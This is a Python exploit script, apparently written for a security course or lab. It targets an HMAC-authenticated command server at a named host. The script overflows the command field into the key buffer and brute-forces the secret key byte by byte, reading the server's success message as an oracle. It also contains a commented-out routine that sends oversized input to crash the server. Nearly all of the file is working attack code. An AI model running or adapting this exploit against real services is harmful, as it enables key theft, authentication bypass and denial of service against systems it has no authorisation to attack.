import socket
import hmac
import hashlib
# import time
import sys


USER_NAME = b"241153"
TAG = b"ClientCmd"
COMMAND_O = b'a' * 30
DILIMIT = b"|"
KEY_LENGTH = 20

HOST = 'device1.vikaa.fi'  # The server's hostname or IP address
PORT = 35984       # The port used by the server

printable_characters = []
for i in range(32, 127):
    printable_characters.append(chr(i).encode("latin-1"))

# fucntion to generate HMAC value, return HMAC value
def generate_hmac(key, msg):
    generated_hmac = hmac.new(key, msg, hashlib.sha256).hexdigest()
    return generated_hmac.encode('ascii')


# function to send command and key to server, return data which contain
# b'Authentication successful. Processing command.\n' if key is correct.
# otherwise, something else.
def deliver_to_server(msg):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        #print('server connected')
        #print("send_msg = ", msg)

        s.sendall(msg + b'\n')

        #print('data sent')
        data = s.recv(1024)
        #print("returned data from fun deliver... = ", data)
        return data

# def crash_server():
#     command = b'a' * 89
#     key = 'bbbbbbbbbbbbbbbbbbbb'
#     hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.connect((HOST, PORT))
#         s.sendall(b'241153;' + command + key.encode("latin-1") + b';' + hmac.encode("latin-1") + b'\n')
#
#         #print('data sent')
#
#         data = s.recv(1024)
#         #print("data = ", data)

key_components = b''

#crash_server()
#time.sleep(10)

while len(key_components) < 20:

    # generate overrun string named fake_cmd
    part_key = b'b' * ((KEY_LENGTH - 1) - len(key_components))
    print("part_key: ", part_key)


    fake_cmd = b'a' * 30 + part_key
    print("fake_cmd: ", fake_cmd)

    char_found = False

    for test_char in printable_characters:
        print('checking char: ', test_char)

        # generate server key-phrase named server_key
        server_key = (part_key + b'\0' + test_char + key_components)[1:]

        # generate server msg
        server_msg = TAG + DILIMIT + USER_NAME + DILIMIT + fake_cmd

        print('server_key: ', server_key)
        print('server_msg: ', server_msg)

        # calulate hmac in the same way as server
        hmac_code = generate_hmac(server_key, server_msg)

        # generate client  msg
        client_msg = USER_NAME + b';' + fake_cmd + b';' + hmac_code

        data = deliver_to_server(client_msg)

        if "successful" in data.decode("latin-1"):
            #key_components.insert(0, test_char)
            key_components = test_char + key_components
            print(key_components)
            char_found = True
            break

    if not char_found:
        print("Not found! current key comonents are:", key_components)
        sys.exit()

print()
print('###############################')
print('Cracked key phrase are:')
print(key_components)
print('###############################')





